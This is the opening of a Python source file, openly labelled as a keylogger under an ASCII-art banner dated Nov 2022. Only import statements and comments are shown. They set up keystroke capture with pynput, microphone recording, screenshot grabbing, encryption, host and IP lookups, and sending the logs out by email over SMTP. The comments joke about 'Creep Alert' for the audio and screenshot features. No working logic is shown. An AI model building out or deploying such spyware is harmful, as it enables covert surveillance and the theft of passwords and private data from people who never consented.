'''
By 

88b.     .d88  
88 `88 88  88                          dP    88
88   `Y`   88                          88  .b8    
88         88   .d888b.     88d888b.   88.dP      .d8888    dP    dP         Nov 2022
88         88  88'   `88    88'  `88   88  `88   88' __88   88    88               
88         88  88.   .88    88    88   88    88  88.        88.  .88 
88         88   `88888`     dP    dP   dP    dP   `888dP    `8888P88 
                                                                 .88
                                                             d8888P                     
'''
# Required Libraries for the keylogger 



# Sending the log files to the email 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders


# Establishing connection with smtp service 
import smtplib 
import socket 
import platform 

# Getting Keystores 
# import win32clipboard 
from pynput.keyboard import Key,Listener 

# Getting Time of the Event 
import time 
import os 

# Recording Audio (Creep Alert!!)
from scipy.io.wavfile import write 
import sounddevice as sd 

# Encryption 
from cryptography.fernet import Fernet 
import getpass 
from requests import get 

# Getting Screenshots (Again Creep Alert!!) 
from multiprocessing import Process,freeze_support 
from PIL import ImageGrab

